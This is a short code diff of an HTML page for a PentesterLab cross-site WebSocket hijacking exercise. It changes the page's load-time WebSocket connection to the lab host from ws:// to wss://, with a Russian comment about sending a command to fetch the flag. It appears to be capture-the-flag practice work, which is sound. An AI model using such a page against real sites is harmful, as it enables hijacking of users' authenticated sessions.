@@ -9,7 +9,7 @@
     <!-- Pentesterlab Exercise: https://pentesterlab.com/exercises/cswsh -->
     <script>
         document.addEventListener("DOMContentLoaded", function (e) {
-            var socket = new WebSocket("ws://ptl-5eb5f0260561-3842b35c53c2.libcurl.me/");
+            var socket = new WebSocket("wss://ptl-5eb5f0260561-3842b35c53c2.libcurl.me/");
 
             // Отправляем команду для получения флага
             socket.onopen = function (event) {
